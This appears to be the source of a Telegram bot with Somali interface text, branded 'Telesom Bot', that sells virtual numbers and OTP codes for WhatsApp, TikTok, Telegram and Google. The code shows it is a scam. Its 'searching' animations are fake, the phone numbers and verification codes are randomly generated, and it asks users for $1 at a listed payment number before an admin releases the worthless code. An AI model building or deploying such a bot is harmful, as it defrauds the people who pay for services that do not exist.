import os
import random
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_data = {}
pending_admin = {}

# ===== HELPERS =====
def generate_service_code(service):
    if service == "whatsapp":
        return "".join(random.choices("0123456789", k=6))
    elif service == "tiktok":
        return "TT" + "".join(random.choices("0123456789", k=5))
    elif service == "telegram":
        return "TG" + "".join(random.choices("0123456789", k=5))
    elif service == "google":
        return "G-" + "".join(random.choices("0123456789", k=8))
    return "".join(random.choices("0123456789", k=6))

def random_number():
    return "063" + str(random.randint(1000000, 9999999))

async def dots_animation(message, base_text, seconds=5):
    for i in range(seconds):
        dots = "." * ((i % 3) + 1)
        await asyncio.sleep(1)
        await message.edit_text(f"{base_text}{dots}")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order"), KeyboardButton(text="Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")]
    ])
    await msg.answer("Dooro nooca:", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton(text="TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton(text="TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton(text="GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro adeeg:", reply_markup=kb)

# ===== SERVICE SELECTED =====
@dp.callback_query(F.data.in_(["whatsapp","tiktok","telegram","google"]))
async def service_selected(call: CallbackQuery):
    service = call.data
    user_data[call.from_user.id] = {"service": service}

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="pay_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])

    await call.message.edit_text(
        "💵 Payment Number: +252907868526\nPrice: $1\n\nRiix CONFIRM si aad u sii wadato.",
        reply_markup=kb
    )

# ===== CANCEL =====
@dp.callback_query(F.data == "cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# ===== FIRST CONFIRM (NUMBER SEARCHING) =====
@dp.callback_query(F.data == "pay_confirm")
async def pay_confirm(call: CallbackQuery):
    msg = await call.message.edit_text("NUMBER Searching.")
    await dots_animation(msg, "NUMBER Searching", 5)

    number = random_number()
    user_data[call.from_user.id]["number"] = number

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="otp_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="cancel")]
    ])

    await msg.edit_text(
        f"Number Found ✅\n\n{number}\n\nRiix CONFIRM si aad OTP u hesho.",
        reply_markup=kb
    )

# ===== SECOND CONFIRM (OTP SEARCHING) =====
@dp.callback_query(F.data == "otp_confirm")
async def otp_confirm(call: CallbackQuery):
    msg = await call.message.edit_text("OTP Searching.")
    await dots_animation(msg, "OTP Searching", 5)

    service = user_data[call.from_user.id]["service"]
    code = generate_service_code(service)
    user_data[call.from_user.id]["code"] = code
    pending_admin[call.from_user.id] = True

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"admin_ok_{call.from_user.id}")]
    ])

    await bot.send_message(
        ADMIN_ID,
        f"New OTP Request\nUser: {call.from_user.id}\nService: {service}\nNumber: {user_data[call.from_user.id]['number']}\nCode: {code}",
        reply_markup=kb
    )

    await asyncio.sleep(10)

    if pending_admin.get(call.from_user.id):
        await call.message.answer("PLEASE SEND MONEY 💵")

# ===== ADMIN APPROVE =====
@dp.callback_query(F.data.startswith("admin_ok_"))
async def admin_approve(call: CallbackQuery):
    user_id = int(call.data.split("_")[-1])

    if user_id in user_data:
        pending_admin[user_id] = False
        code = user_data[user_id]["code"]
        await bot.send_message(user_id, f"Payment Confirmed ✅\n\nYour OTP Code: {code}")
        await call.message.edit_text("Approved ✅")

# ===== RUN =====
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
